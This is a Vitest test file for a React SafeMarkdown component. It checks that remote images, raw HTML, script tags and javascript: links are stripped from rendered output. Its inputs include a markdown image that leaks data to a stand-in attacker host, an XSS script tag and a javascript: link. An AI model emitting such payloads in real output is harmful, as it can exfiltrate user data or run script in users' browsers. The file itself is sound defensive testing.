import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import { SafeMarkdown } from "./safe-markdown";

const render = (markdown: string) => renderToStaticMarkup(<SafeMarkdown>{markdown}</SafeMarkdown>);

describe("SafeMarkdown (baseline S7)", () => {
  it("never renders a remote image, even as markdown", () => {
    const html = render("![secret](http://attacker.example/leak?d=policy)");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example");
    expect(html).toContain("[image: secret]");
  });

  it("does not render raw HTML", () => {
    const html = render('Hello <img src="http://attacker.example/x"> <script>alert(1)</script>');
    expect(html).not.toContain("<img");
    expect(html).not.toContain("<script");
  });

  it("drops javascript: links", () => {
    const html = render("[click](javascript:alert(1))");
    expect(html).not.toContain("javascript:");
  });

  it("opens links safely", () => {
    const html = render("[docs](https://example.com)");
    expect(html).toContain('rel="noopener noreferrer nofollow"');
    expect(html).toContain('target="_blank"');
  });

  it("still renders ordinary formatting", () => {
    expect(render("**bold** and `code`")).toContain("<strong>bold</strong>");
  });
});
